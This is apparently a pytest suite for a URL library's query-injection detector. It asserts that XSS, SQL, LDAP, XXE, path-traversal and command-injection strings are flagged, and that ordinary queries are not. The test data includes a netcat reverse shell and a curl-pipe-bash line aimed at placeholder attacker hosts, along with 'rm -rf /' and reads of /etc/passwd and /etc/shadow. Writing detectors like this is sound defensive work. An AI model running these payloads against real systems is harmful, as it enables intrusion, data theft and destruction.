"""Tests for query parameter injection detection."""
import pytest
from urlps._security import has_query_injection


class TestXSSDetection:
    """Test Cross-Site Scripting (XSS) pattern detection."""

    def test_basic_script_tags(self):
        """Basic script tag injection should be detected."""
        assert has_query_injection("q=<script>alert(1)</script>")
        assert has_query_injection("name=test<script>")
        assert has_query_injection("value=</script>")

    def test_javascript_protocol(self):
        """JavaScript protocol should be detected."""
        assert has_query_injection("url=javascript:alert(1)")
        assert has_query_injection("redirect=javascript:void(0)")

    def test_event_handlers(self):
        """HTML event handlers should be detected."""
        assert has_query_injection("name=test onerror=alert(1)")
        assert has_query_injection("img=x onload=evil()")
        assert has_query_injection("div onclick=malicious()")
        assert has_query_injection("x onmouseover=bad()")

    def test_html_tags_with_src(self):
        """HTML tags with src attribute should be detected."""
        assert has_query_injection("q=<img src=x>")
        assert has_query_injection("data=<iframe src=evil.com>")
        assert has_query_injection("embed=<object src=bad>")

    def test_data_uri_xss(self):
        """Data URI XSS should be detected."""
        assert has_query_injection("url=data:text/html,<script>alert(1)</script>")
        assert has_query_injection("img=data:text/html;base64,PHNjcmlwdD4=")

    def test_svg_xss(self):
        """SVG-based XSS should be detected."""
        assert has_query_injection("svg=<svg onload=alert(1)>")
        assert has_query_injection("data=<svg><script>alert(1)</script></svg>")

    def test_encoded_xss(self):
        """URL-encoded XSS patterns should be detected."""
        assert has_query_injection("q=%3cscript%3ealert(1)%3c/script%3e")
        assert has_query_injection("name=test%3cimg%20src=x")

    def test_safe_html_like_content(self):
        """Safe content that looks like HTML should not trigger."""
        assert not has_query_injection("price=<100")
        assert not has_query_injection("math=x>5")
        assert not has_query_injection("name=John")


class TestSQLInjectionDetection:
    """Test SQL injection pattern detection."""

    def test_union_based_injection(self):
        """UNION-based SQL injection should be detected."""
        assert has_query_injection("id=1 UNION SELECT password FROM users")
        assert has_query_injection("id=1 union all select * from admin")

    def test_boolean_based_injection(self):
        """Boolean-based blind SQL injection should be detected."""
        assert has_query_injection("id=1' OR '1'='1")
        assert has_query_injection('user=admin" OR "1"="1')
        assert has_query_injection("id=1' or 1=1--")

    def test_comment_based_injection(self):
        """SQL comment-based injection should be detected."""
        assert has_query_injection("user=admin'--")
        assert has_query_injection("id=1/**/UNION/**/SELECT")
        assert has_query_injection("name=test'/*comment*/")

    def test_destructive_sql_commands(self):
        """Destructive SQL commands should be detected."""
        assert has_query_injection("cmd=DROP TABLE users")
        assert has_query_injection("query=DELETE FROM admin")
        assert has_query_injection("sql=INSERT INTO users VALUES")

    def test_sql_stored_procedures(self):
        """SQL stored procedure calls should be detected."""
        assert has_query_injection("cmd=EXEC xp_cmdshell 'dir'")
        assert has_query_injection("query=EXECUTE sp_executesql")
        assert has_query_injection("sql=exec(select)")

    def test_legitimate_sql_like_queries(self):
        """Legitimate queries that contain SQL-like words should not trigger."""
        # These are borderline but currently will trigger - acceptable for security
        # If we need to allow these, we'd need context-aware validation
        assert not has_query_injection("search=select a product")
        assert not has_query_injection("name=Union Street")


class TestCommandInjectionDetection:
    """Test command injection pattern detection."""

    def test_command_chaining(self):
        """Command chaining operators should be detected."""
        assert has_query_injection("cmd=ls && cat /etc/passwd")
        assert has_query_injection("exec=dir || type secrets.txt")
        assert has_query_injection("run=whoami ; rm -rf /")

    def test_command_substitution(self):
        """Command substitution should be detected."""
        assert has_query_injection("cmd=$(cat /etc/passwd)")
        assert has_query_injection("exec=`whoami`")

    def test_system_paths(self):
        """System paths often used in attacks should be detected."""
        assert has_query_injection("file=/etc/passwd")
        assert has_query_injection("path=/bin/sh")
        assert has_query_injection("cmd=cat /etc/shadow")

    def test_windows_commands(self):
        """Windows-specific command injection should be detected."""
        assert has_query_injection("cmd=cmd.exe /c dir")
        assert has_query_injection("exec=powershell -Command Get-Process")

    def test_network_tools(self):
        """Network tool invocations should be detected."""
        assert has_query_injection("cmd=nc -e /bin/sh attacker.com 4444")
        assert has_query_injection("exec=|cat /etc/passwd | nc attacker.com")


class TestLDAPInjectionDetection:
    """Test LDAP injection pattern detection."""

    def test_ldap_filter_injection(self):
        """LDAP filter injection should be detected."""
        assert has_query_injection("user=*)(uid=*)(|(uid=*")
        assert has_query_injection("filter=(cn=*)")
        assert has_query_injection("query=(|(uid=admin))")

    def test_ldap_authentication_bypass(self):
        """LDAP authentication bypass patterns should be detected."""
        assert has_query_injection("user=*)(&(uid=admin)")
        assert has_query_injection("name=(|)")


class TestXMLInjectionDetection:
    """Test XML/XXE injection pattern detection."""

    def test_xxe_patterns(self):
        """XML External Entity (XXE) patterns should be detected."""
        assert has_query_injection("xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>")
        assert has_query_injection("data=<!ENTITY xxe 'attack'>")

    def test_xml_special_sections(self):
        """XML special sections should be detected."""
        assert has_query_injection("xml=<![CDATA[<script>alert(1)</script>]]>")
        assert has_query_injection("data=<?xml version='1.0'?>")


class TestPathTraversalInQuery:
    """Test path traversal patterns in query strings."""

    def test_directory_traversal(self):
        """Directory traversal in query parameters should be detected."""
        assert has_query_injection("file=../../etc/passwd")
        assert has_query_injection("path=..\\..\\windows\\system32")

    def test_encoded_traversal(self):
        """URL-encoded path traversal should be detected."""
        assert has_query_injection("file=%2e%2e%2fetc%2fpasswd")
        assert has_query_injection("path=%2e%2e%5cwindows%5csystem32")


class TestEncodedInjectionPatterns:
    """Test detection of encoded injection patterns."""

    def test_encoded_angle_brackets(self):
        """Encoded < and > should be detected in XSS context."""
        # Suspicious: encoded brackets followed by script-related keywords
        assert has_query_injection("q=%3cscript%3e")
        assert has_query_injection("x=%3ciframe%3e")
        assert has_query_injection("y=%3csvg%3e")

    def test_encoded_quotes_in_sql_context(self):
        """Encoded quotes in SQL context should be detected."""
        assert has_query_injection("id=1%27%20or%201=1")
        assert has_query_injection("user=admin%22%20or%201=1")

    def test_encoded_command_operators(self):
        """Encoded command operators should be detected."""
        assert has_query_injection("cmd=ls%3bcat%20file")  # ;
        assert has_query_injection("exec=cmd%7cdir")  # |
        assert has_query_injection("run=test%26%26whoami")  # &&


class TestSafeQueryStrings:
    """Test that legitimate query strings don't trigger false positives."""

    def test_normal_search_queries(self):
        """Normal search queries should be safe."""
        assert not has_query_injection("q=python tutorial")
        assert not has_query_injection("search=how to learn programming")
        assert not has_query_injection("query=best practices")

    def test_normal_parameters(self):
        """Normal parameter values should be safe."""
        assert not has_query_injection("name=John&age=25&city=NewYork")
        assert not has_query_injection("id=12345&category=electronics")
        assert not has_query_injection("page=1&limit=10&sort=asc")

    def test_encoded_safe_content(self):
        """URL-encoded safe content should not trigger."""
        assert not has_query_injection("name=John%20Doe")
        assert not has_query_injection("email=user%40example.com")
        assert not has_query_injection("msg=Hello%20World")

    def test_special_chars_in_safe_context(self):
        """Special characters in safe contexts should not trigger."""
        assert not has_query_injection("email=user@example.com")
        assert not has_query_injection("price=19.99")
        assert not has_query_injection("coords=40.7128,-74.0060")

    def test_empty_or_invalid_input(self):
        """Empty or invalid inputs should return False."""
        assert not has_query_injection("")
        assert not has_query_injection(None)
        assert not has_query_injection(123)
        assert not has_query_injection([])


class TestRealWorldInjectionScenarios:
    """Test real-world injection attack scenarios."""

    def test_ecommerce_xss(self):
        """E-commerce XSS attacks."""
        assert has_query_injection("product=<script>document.cookie</script>")
        assert has_query_injection("review=Great!<img src=x onerror=alert(1)>")

    def test_authentication_bypass(self):
        """Authentication bypass attempts."""
        assert has_query_injection("username=admin'--")
        assert has_query_injection("password=' OR '1'='1")

    def test_file_disclosure(self):
        """File disclosure attempts."""
        assert has_query_injection("file=../../../../etc/passwd")
        assert has_query_injection("path=/etc/shadow")

    def test_remote_code_execution(self):
        """Remote code execution attempts."""
        assert has_query_injection("cmd=; nc -e /bin/sh attacker.com 4444")
        assert has_query_injection("exec=$(curl http://evil.com/shell.sh | bash)")

    def test_stored_xss(self):
        """Stored XSS payload attempts."""
        assert has_query_injection("comment=<svg/onload=alert(document.domain)>")
        assert has_query_injection("bio=<iframe src=javascript:alert(1)>")

    def test_blind_sql_injection(self):
        """Blind SQL injection attempts."""
        assert has_query_injection("id=1' AND SLEEP(5)--")
        assert has_query_injection("user=admin' AND '1'='1")


class TestCaseSensitivityAndVariations:
    """Test case sensitivity and pattern variations."""

    def test_case_insensitive_detection(self):
        """Detection should be case-insensitive."""
        assert has_query_injection("q=<SCRIPT>alert(1)</SCRIPT>")
        assert has_query_injection("q=<Script>Alert(1)</Script>")
        assert has_query_injection("sql=UNION SELECT")
        assert has_query_injection("sql=Union Select")

    def test_mixed_case_with_encoding(self):
        """Mixed case with encoding should be detected."""
        assert has_query_injection("q=%3CsCrIpT%3E")
        assert has_query_injection("sql=UnIoN%20SeLeCt")

    def test_whitespace_variations(self):
        """Whitespace variations should be detected."""
        assert has_query_injection("sql=UNION  SELECT")  # Double space
        assert has_query_injection("xss=<script >alert(1)</script>")  # Space in tag
